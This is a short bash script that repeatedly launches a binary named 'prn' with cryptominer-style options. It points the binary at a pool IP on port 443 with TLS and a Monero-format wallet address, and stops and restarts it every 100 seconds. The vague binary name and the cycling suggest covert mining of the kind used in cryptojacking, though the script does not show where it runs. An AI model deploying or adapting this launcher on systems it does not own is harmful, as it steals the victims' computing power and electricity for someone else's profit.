#!/bin/bash

while true; do
    # Run the command with full path for clarity
    ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen &

    # Get the process ID of the command
    pid=$!

    # Allow the command to run for 100 seconds
    sleep 100

    # Terminate the command gracefully
    kill $pid

    # Wait for 10 seconds before restarting
    sleep 10
done
